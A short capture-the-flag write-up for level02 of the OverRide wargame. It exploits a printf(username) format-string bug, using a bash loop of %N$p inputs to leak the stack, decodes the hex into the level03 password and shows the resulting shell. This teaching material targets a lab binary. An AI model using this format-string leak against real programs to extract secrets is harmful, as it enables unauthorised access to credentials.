in the elf, the main get the next flag:

    int fd = fopen("/home/users/level03/.pass", "r");
    [...]
    char buf[41];
    int len = fread(buf, 1, 41, fd);

we also have a function that print what user input:

    char username[100];
    printf("--[ Username: ");
    fgets(username, 100, stdin);
    [...]
    printf(username);
    puts(" does not have access!");

if we merge both idea we can use the printf (not protected) to print the data in the stack and those the password

this is a simple bash functions that display contents from the stack:

```bash
for i in {1..42};
    do echo $i %$i\$p | ./level02 | grep does;
done
```

when runing it we see differents data most between 22 and 26, it can be the password

    22 0x756e505234376848 does not have access!
    23 0x45414a3561733951 does not have access!
    24 0x377a7143574e6758 does not have access!
    25 0x354a35686e475873 does not have access!
    26 0x48336750664b394d does not have access!

let convert them from [hex to ascii](https://www.rapidtables.com/convert/number/hex-to-ascii.html) and [reverse](https://string-functions.com/reverse.aspx) those:

    0x756e505234376848 -> Hh74RPnu
    0x45414a3561733951 -> Q9sa5JAE
    0x377a7143574e6758 -> XgNWCqz7
    0x354a35686e475873 -> sXGnh5J5
    0x48336750664b394d -> M9KfPg3H

let's try by merging them:

    level02@OverRide:~$ ./level02 
    ===== [ Secure Access System v1.0 ] =====
    /***************************************\
    | You must login to access this system. |
    \**************************************/
    --[ Username: bg ultime
    --[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
    *****************************************
    Greetings, bg ultime!
    $ whoami
    level03
